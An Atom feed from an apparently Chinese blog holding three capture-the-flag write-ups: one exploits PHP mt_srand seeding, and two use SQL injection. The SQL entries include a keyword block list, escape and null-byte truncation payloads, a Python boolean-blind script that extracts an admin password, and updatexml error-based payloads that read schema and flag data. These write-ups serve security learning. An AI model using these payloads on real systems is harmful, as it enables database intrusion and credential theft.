<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>d0ud</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-03-26T06:34:16.049Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>d0ud</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>&lt;GWCTF 2019&gt;枯燥的抽奖</title>
    <link href="http://example.com/[GWCTF%202019]%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/"/>
    <id>http://example.com/[GWCTF%202019]%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/</id>
    <published>2021-12-01T16:00:00.000Z</published>
    <updated>2022-03-26T06:34:16.049Z</updated>
    
    <content type="html"><![CDATA[<p>打开题目，从源码里发现<code>check.php</code><br>访问得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php">ljiUB7yF7i<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#这不是抽奖程序的源代码！不许看！</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]))&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]=<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">999999999</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]);<br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>    <span class="hljs-variable">$str</span>.=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str_long1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       <br>&#125;<br><span class="hljs-variable">$str_show</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="hljs-variable">$str_show</span>.<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>]===<span class="hljs-variable">$str</span>)&#123;x<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;check.php&quot;</span>);<br></code></pre></td></tr></table></figure><p>利用了伪随机函数<code>mt_srand()</code>，虽然种子在服务端产生，但是是固定不变的，爆破种子推出<code>$str</code>即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;打开题目，从源码里发现&lt;code&gt;check.php&lt;/code&gt;&lt;br&gt;访问得到源码&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/sp</summary>
      
    
    
    
    <category term="wp" scheme="http://example.com/categories/wp/"/>
    
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>&lt;NCTF2019&gt;SQLi</title>
    <link href="http://example.com/[NCTF2019]SQLi/"/>
    <id>http://example.com/[NCTF2019]SQLi/</id>
    <published>2021-11-30T16:00:00.000Z</published>
    <updated>2022-03-26T06:36:19.898Z</updated>
    
    <content type="html"><![CDATA[<p>打开题目</p><blockquote><p>sqlquery : select * from users where username=’’ and passwd=’’</p></blockquote><p>存在<code>robots.txt</code>，得到提示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$black_list</span> = <span class="hljs-string">&quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;</span>;<br><br><br>If <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>] === admin<span class="hljs-string">&#x27;s password,</span><br><span class="hljs-string"></span><br><span class="hljs-string">Then you will get the flag;</span><br></code></pre></td></tr></table></figure><p>过滤了单引号，但没有过滤转义符号，还是可以逃逸的，php是可以<code>%00</code>截断的版本</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">username=\&amp;passwd=||(1);%00<br></code></pre></td></tr></table></figure><p>得到</p><blockquote><p><strong>HTTP/1.1 302 Found</strong><br>Server: openresty<br>Date: Wed, 01 Dec 2021 09:17:49 GMT<br>Content-Type: text/html<br>Content-Length: 2228<br>Connection: close<br><strong>Location: welcome.php</strong><br>X-Powered-By: PHP/5.2.16</p></blockquote><p>根据提示需要获取admin的密码，显然是布尔盲注了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><br>urll=<span class="hljs-string">&quot;http://6cd4da7b-0239-4646-a44a-8ef97233503e.node4.buuoj.cn:81&quot;</span><br>dataa=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<span class="hljs-string">&quot;passwd&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;<br>passwd=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    <span class="hljs-built_in">print</span>(i,end=<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;qwertyuioplkjhgfdsazxcvbnmAQZXSWEDCVFRTGBNHYUJMKIOLP1234567890_&quot;</span>:<br>        payload=<span class="hljs-string">f&quot;||(passwd/**/regexp/**/\&quot;^<span class="hljs-subst">&#123;passwd&#125;</span><span class="hljs-subst">&#123;w&#125;</span>\&quot;);&quot;</span>+parse.unquote(<span class="hljs-string">&quot;%00&quot;</span>)<br>        dataa[<span class="hljs-string">&quot;passwd&quot;</span>]=payload<br>        response=requests.post(url=urll,data=dataa,allow_redirects=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">302</span>:<br>            passwd+=w<br>            <span class="hljs-built_in">print</span>(passwd)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>提交密码，得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;打开题目&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;sqlquery : select * from users where username=’’ and passwd=’’&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;存在&lt;code&gt;robots.txt&lt;/code&gt;，得到</summary>
      
    
    
    
    <category term="wp" scheme="http://example.com/categories/wp/"/>
    
    
    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>&lt;RCTF2015&gt;EasySQL</title>
    <link href="http://example.com/[RCTF2015]EasySQL/"/>
    <id>http://example.com/[RCTF2015]EasySQL/</id>
    <published>2021-11-24T16:00:00.000Z</published>
    <updated>2022-03-26T06:46:09.447Z</updated>
    
    <content type="html"><![CDATA[<p>打开题目，测试功能。<br>注册，登录，修改密码，那么极有可能存在二次注入。<br>经过测试，发现如果注册的用户名含有双引号，在修改密码后页面回显报错信息。例如</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“a”” and pwd=’72ea3f1e65a1d2b8046e7fb756498dbd’’ at line 1</p></blockquote><p>不难猜测语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> ... <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span>&quot;...&quot; <span class="hljs-keyword">and</span> pwd<span class="hljs-operator">=</span><span class="hljs-string">&#x27;...&#x27;</span> ;<br></code></pre></td></tr></table></figure><p>由于无其他查询回显页面，尝试报错注入</p><p>库名</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">aaaaa&quot;||updatexml(1,(concat(0x7e,(database()),0x7e)),1)#<br></code></pre></td></tr></table></figure><blockquote><p>XPATH syntax error: ‘~web_sqli~’</p></blockquote><p>表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">aaaaa&quot;||updatexml(1,(concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e)),1)#<br></code></pre></td></tr></table></figure><blockquote><p>XPATH syntax error: ‘~article,flag,users~’</p></blockquote><p>列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">bbbb&quot;||updatexml(1,(concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;)),0x7e)),1)#<br></code></pre></td></tr></table></figure><blockquote><p>XPATH syntax error: ‘<del>flag</del>‘</p></blockquote><p>数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">ddddd&quot;||updatexml(1,(concat(0x7e,(select(group_concat(flag))from(flag)),0x7e)),1)#<br></code></pre></td></tr></table></figure><blockquote><p>XPATH syntax error: ‘~RCTF{Good job! But flag not her’</p></blockquote><p>虚晃一枪，能看出来是截断的，显示16个字符<br>最终发现flag是在表<code>users</code>里，截断函数都被过滤了，没有过滤<code>reverse()</code></p><p>前半段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">ddddd&quot;||updatexml(1,(concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e)),1)#<br></code></pre></td></tr></table></figure><blockquote><p>XPATH syntax error: ‘~xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxx’</p></blockquote><p>可以发现有其他字符干扰，没法完全读取，正则函数未被过滤，尝试使用正则</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">ddddd&quot;||updatexml(1,(concat(0x7e,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(&#x27;^flag&#x27;)),0x7e)),1)#<br></code></pre></td></tr></table></figure><p>配合<code>reverse()</code>得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;打开题目，测试功能。&lt;br&gt;注册，登录，修改密码，那么极有可能存在二次注入。&lt;br&gt;经过测试，发现如果注册的用户名含有双引号，在修改密码后页面回显报错信息。例如&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;You have an error in your SQL syntax</summary>
      
    
    
    
    <category term="wp" scheme="http://example.com/categories/wp/"/>
    
    
    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
